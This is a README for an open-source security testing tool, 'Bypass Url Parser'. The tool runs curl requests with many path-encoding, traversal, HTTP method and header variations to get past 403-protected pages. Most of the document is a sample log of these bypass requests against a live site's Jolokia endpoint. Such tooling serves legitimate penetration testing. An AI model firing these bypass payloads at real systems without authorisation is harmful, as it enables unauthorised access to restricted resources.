# Bypass Url Parser

Tool that tests `MANY` url bypasses to reach a `40X protected page`.

If you wonder why this code is `nothing but a dirty curl wrapper`, here's why:

- Most of the python requests do url/path/parameter encoding/decoding, and I hate this.
- If I submit raw chars, I want raw chars to be sent.
- If I send a weird path, I want it weird, not normalized.

This is `surprisingly hard` to achieve in python without loosing all of the lib goodies like parsing, ssl/tls encaptilation and so on. \
So, be like me, use `curl as a backend`, it's gonna be just fine.


## Setup for bypass.py

```bash
# Deps
sudo apt install -y bat curl virtualenv python3
# Tool
virtualenv -p python3 .py3
source .py3/bin/activate
pip install -r requirements.txt
./bypass-url-parser.py --url "http://127.0.0.1/juicy_403_endpoint/"
```


## Usage

```
Bypass Url Parser, made with love by @TheLaluka
A tool that tests MANY url bypasses to reach a 40X protected page.

Usage:
    ./bypass-url-parser.py --url=<URL> [--outdir=<OUTDIR>] [--threads=<threads>] [--timeout=<timeout>] [(--header=<header>)...] [--spoofip=<ip>] [--debug]
    ./bypass-url-parser.py (-h | --help)
    ./bypass-url-parser.py (-v | --version)

Options:
    -h --help            Show help, you are here :)
    -v --version         Show version info.
    --url=<URL>          URL (path is optional) to run bypasses against.
    --outdir=<outdir>    Output directory for results.
    --timeout=<timeout>  Request times out after N seconds [Default: 3].
    --threads=<threads>  Scan with N parallel threads [Default: 1].
    --header=<header>    Header(s) to use, format: "Cookie: can_i_haz=fire".
    --spoofip=<ip>       IP to inject in ip-specific headers.
    --debug              Enable debugging output, to... Tou know... Debug.

Example:
    ./bypass-url-parser.py --url "http://127.0.0.1/juicy_403_endpoint/" --spoofip 8.8.8.8 --debug
    ./bypass-url-parser.py --url "http://127.0.0.1/juicy_403_endpoint/" --threads 30 --timeout 5 --header "Cookie: me_iz=damin" --header "Waf: bypazzzzz"
```


## Expected result

```
2022-05-10 15:54:03 work bup[738125] INFO === Config ===
2022-05-10 15:54:03 work bup[738125] INFO debug: False
2022-05-10 15:54:03 work bup[738125] INFO url: http://thinkloveshare.com/api/jolokia/list
2022-05-10 15:54:03 work bup[738125] INFO outdir: /tmp/tmp48drf_ie-bypass-url-parser
2022-05-10 15:54:03 work bup[738125] INFO threads: 20
2022-05-10 15:54:03 work bup[738125] INFO timeout: 2
2022-05-10 15:54:03 work bup[738125] INFO headers: {}
2022-05-10 15:54:03 work bup[738125] WARNING Stage: generate_curls
2022-05-10 15:54:03 work bup[738125] INFO base_url: http://thinkloveshare.com
2022-05-10 15:54:03 work bup[738125] INFO base_path: /api/jolokia/list
2022-05-10 15:54:03 work bup[738125] WARNING Stage: run_curls
2022-05-10 15:54:03 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com/api/jolokia/list'
2022-05-10 15:54:03 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' -X 'CONNECT' 'http://thinkloveshare.com/api/jolokia/list'
2022-05-10 15:54:03 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' -X 'GET' 'http://thinkloveshare.com/api/jolokia/list'
2022-05-10 15:54:03 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' -X 'LOCK' 'http://thinkloveshare.com/api/jolokia/list'
2022-05-10 15:54:03 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' -X 'OPTIONS' 'http://thinkloveshare.com/api/jolokia/list'
2022-05-10 15:54:03 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' -X 'PATCH' 'http://thinkloveshare.com/api/jolokia/list'
2022-05-10 15:54:03 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' -X 'POST' 'http://thinkloveshare.com/api/jolokia/list'
2022-05-10 15:54:03 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' -X 'POUET' 'http://thinkloveshare.com/api/jolokia/list'
2022-05-10 15:54:03 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' -X 'PUT' 'http://thinkloveshare.com/api/jolokia/list'
2022-05-10 15:54:03 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' -X 'TRACE' 'http://thinkloveshare.com/api/jolokia/list'
2022-05-10 15:54:03 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' -X 'TRACK' 'http://thinkloveshare.com/api/jolokia/list'
2022-05-10 15:54:03 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' -X 'UPDATE' 'http://thinkloveshare.com/api/jolokia/list'
2022-05-10 15:54:03 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' -H 'Access-Control-Allow-Origin: 0.0.0.0' 'http://thinkloveshare.com/api/jolokia/list'
2022-05-10 15:54:03 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' -H 'Access-Control-Allow-Origin: 127.0.0.1' 'http://thinkloveshare.com/api/jolokia/list'
2022-05-10 15:54:03 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' -H 'Access-Control-Allow-Origin: localhost' 'http://thinkloveshare.com/api/jolokia/list'
2022-05-10 15:54:03 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' -H 'Access-Control-Allow-Origin: norealhost' 'http://thinkloveshare.com/api/jolokia/list'
[...]
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%252f%252f//list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%26//list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%2e//list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%2e%2e//list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%2e%2e///list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%2e%2e%2f//list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%2f//list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%2f///list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%2f%20%23//list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%2f%23//list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%2f%2f//list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%2f%3b%2f//list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%2f%3b%2f%2f//list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%2f%3f//list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%2f%3f///list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%3b//list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%3b/..//list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%3b//%2f..///list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%3b/%2e.//list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%3b/%2e%2e/..%2f%2f//list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%3b/%2f%2f..///list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%3b%09//list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%3b%2f..//list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%3b%2f%2e.//list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%3b%2f%2e%2e//list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%3b%2f%2e%2e%2f%2e%2e%2f%2f//list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%3f//list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%3f%23//list'
2022-05-10 15:54:09 work bup[738125] INFO Current: curl -sS -kgi --path-as-is -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -w '\nStatus: %{http_code}, Length: %{size_download}' 'http://thinkloveshare.com//api/jolokia//%3f%3f//list'
2022-05-10 15:54:09 work bup[738125] WARNING Stage: save_and_quit
2022-05-10 15:54:10 work bup[738125] INFO Saving html pages and short output in: /tmp/tmp48drf_ie-bypass-url-parser
2022-05-10 15:54:10 work bup[738125] INFO Triaged results shows the following distinct pages:
    9:   41 - 850a2bd214c68f582aaac1c84c702b5d.html
   10:   97 - 219145da181c48fea603aab3097d8201.html
   10:   99 - 309b8397d07f618ec07541c418979a84.html
   10:  100 - 9a1304f66bfee2130b34258635d50171.html
   10:  108 - b61052875693afa4b86d39321d4170b4.html
   10:  109 - 6fb5c59f5c29d23e407d6f041523a2bb.html
   11:  101 - 045d36e3cfba7f6cbb7e657fc6cf1125.html
   12:43116 - 9787a734c56b37f7bf5d78aaee43c55d.html
   16:   41 - c5663aedf1036c950a5d83bd83c8e4e7.html
   21:  156 - 7857d3d4a9bc8bf69278bf43c4918909.html
   22:  107 - 011ca570bdf2e5babcf4f99c4cd84126.html
   22:  109 - 6d4b61258386f744a388d402a5f11d03.html
   22:  110 - 2f26cd3ba49e023dbda4453e5fd89431.html
   76:  821 - bfe5f92861f949e44b355ee22574194a.html
2022-05-10 15:54:10 work bup[738125] INFO Also, inspect them manually with batcat:
echo /tmp/tmp48drf_ie-bypass-url-parser/{850a2bd214c68f582aaac1c84c702b5d.html,219145da181c48fea603aab3097d8201.html,309b8397d07f618ec07541c418979a84.html,9a1304f66bfee2130b34258635d50171.html,b61052875693afa4b86d39321d4170b4.html,6fb5c59f5c29d23e407d6f041523a2bb.html,045d36e3cfba7f6cbb7e657fc6cf1125.html,9787a734c56b37f7bf5d78aaee43c55d.html,c5663aedf1036c950a5d83bd83c8e4e7.html,7857d3d4a9bc8bf69278bf43c4918909.html,011ca570bdf2e5babcf4f99c4cd84126.html,6d4b61258386f744a388d402a5f11d03.html,2f26cd3ba49e023dbda4453e5fd89431.html,bfe5f92861f949e44b355ee22574194a.html} | xargs bat
```
